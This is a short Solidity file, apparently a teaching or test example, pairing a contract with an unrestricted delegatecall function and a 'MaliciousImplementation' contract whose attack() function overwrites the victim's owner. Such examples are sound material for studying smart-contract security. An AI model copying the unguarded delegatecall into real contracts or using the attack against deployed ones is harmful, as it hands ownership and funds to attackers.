// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract DelegatecallVictim {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function execute(
        address target,
        bytes calldata data
    ) external {
        (bool success, ) = target.delegatecall(data);
        require(success, "delegatecall failed");
    }
}

contract MaliciousImplementation {
    address public owner;

    function attack() external {
        owner = msg.sender;
    }
}
